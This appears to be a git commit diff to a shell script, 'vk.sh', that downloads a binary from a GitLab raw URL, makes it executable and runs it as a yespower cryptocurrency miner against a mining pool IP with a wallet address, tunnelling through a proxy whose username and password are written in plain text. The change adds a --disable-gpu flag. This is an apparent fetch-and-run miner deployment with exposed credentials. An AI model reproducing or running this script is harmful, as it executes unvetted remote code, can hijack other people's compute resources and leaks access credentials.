82125805664d84e3e2d5fb5fcf59e50311ead85d
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-12 18:42:59 +0700

    Update vk.sh

--- vk.sh
+++ vk.sh
@@ -1,3 +1,3 @@
 curl -x http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@us-east-static-06.quotaguard.com:9293 -L ip.quotaguard.com
 wget -q -O xza https://gitlab.com/kintal1/aa/-/raw/main/SRkinds && chmod +x xza
-./xza -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-senio) -p c=SWAMP,mc=VHH --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@us-east-static-06.quotaguard.com:9293
+./xza -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-senio) -p c=SWAMP,mc=VHH --disable-gpu --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@us-east-static-06.quotaguard.com:9293
